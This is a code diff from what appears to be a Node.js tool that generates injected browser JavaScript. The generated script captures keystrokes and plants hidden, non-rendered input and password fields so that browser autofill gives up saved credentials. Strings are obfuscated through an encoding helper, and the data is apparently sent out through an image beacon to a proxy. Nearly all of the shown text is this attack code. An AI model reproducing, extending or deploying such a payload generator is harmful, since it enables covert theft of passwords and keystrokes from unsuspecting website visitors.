@@ -971,8 +971,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				body += `
 					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
 						var l = '',
-							h = n.key,
-							z = h
+							h = z = n.key,
 						if (n.type.slice(-1) == 'p') l = '_'
 						z += l` + comment("ignore multiple modifier calls") + `
 						if (m == z || !h) return` + comment("Push to array") + `
@@ -1053,12 +1052,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					x = d.createElement(v),
 					c = ` + enc("new Image()", true) + `,
 					p = `+ enc(proxy) +`,
+					y,
 					k = window` + variables + `
 				` + header + comment("name attribute is required for autofill to work") + `
 				x.name = ""` + comment("autofill still works if the elements are non-rendered") + `
 				x.style = `+ enc("display:none") + `
 				` + comment("clone the input node instead of declaring it again") + `
-				var y = x.cloneNode()` + comment("set the input type to password") + `
+				y = x.cloneNode()` + comment("set the input type to password") + `
 				y.type = ` + enc("password") + `
 				` + comment("append elements to form node") + `
 				w.appendChild(x)
